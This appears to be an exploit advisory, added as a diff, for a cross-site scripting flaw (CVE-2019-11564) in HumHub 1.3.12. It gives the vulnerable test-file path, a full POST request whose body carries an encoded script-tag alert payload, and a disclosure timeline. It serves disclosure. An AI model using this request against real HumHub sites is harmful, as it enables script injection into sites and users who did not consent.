@@ -1,0 +1,39 @@
+# Exploit Title: HumHub 1.3.12 - Cross-Site Scripting
+# Exploit Author: Kağan EĞLENCE
+# Vendor Homepage: https://humhub.org/
+# Version: 1.3.12
+# CVE : CVE-2019-11564
+
+
+Url : http://localhost/humhub-1.3.12/protected/vendor/codeception/codeception/tests/data/app/view/index.php
+Vulnerable File :
+/protected/vendor/codeception/codeception/tests/data/app/view/index.php
+Request Type: POST
+
+
+#Request Example:
+=============
+
+    POST /humhub-1.3.12/protected/vendor/codeception/codeception/tests/data/app/view/index.php
+HTTP/1.1
+    Host: localhost
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/73.0.3683.83 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: http://localhost/humhub-1.3.12/protected/vendor/codeception/codeception/tests/data/app/view/index.php
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 64
+    Connection: close
+    Cookie: xxxx
+    Upgrade-Insecure-Requests: 1
+
+    %3Cscript%3Ealert%28%22Vulnerable%22%29%3C%2Fscript%3E=undefined
+
+### History
+=============
+2019-4-10  Issue discovered
+2019-4-10  Vendor contacted
+2019-4-10  Vendor response and hotfix
+2019-4-27  Advisory release
